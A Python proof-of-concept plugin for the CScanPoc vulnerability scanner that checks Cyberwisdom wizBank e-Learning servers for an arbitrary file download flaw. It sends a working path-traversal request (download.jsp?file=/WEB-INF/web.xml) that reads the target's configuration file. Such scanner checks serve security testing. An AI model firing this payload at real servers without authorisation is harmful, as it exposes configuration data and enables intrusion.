# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    vuln_id = 'Cyberwisdom_0001' # 平台漏洞编号，留空
    name = '汇思e-Learning平台wizBank 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2016-01-17'  # 漏洞公布时间
    desc = '''
        汇思e-Learning平台wizBank 网站配置不当，导致可以直接下载应用配置信息。
    '''  # 漏洞描述
    ref = 'https://www.secpulse.com/archives/44850.html'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'Cyberwisdom(汇思软件)'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'beb5ab0d-fc64-498a-a4fb-237c98993cfd'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = "/cw/skin1/jsp/download.jsp?file=/WEB-INF/web.xml"
            verify_url = self.target + payload
            req = requests.get(verify_url)
            if req.status_code == 200 and 'log4jConfigLocation' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()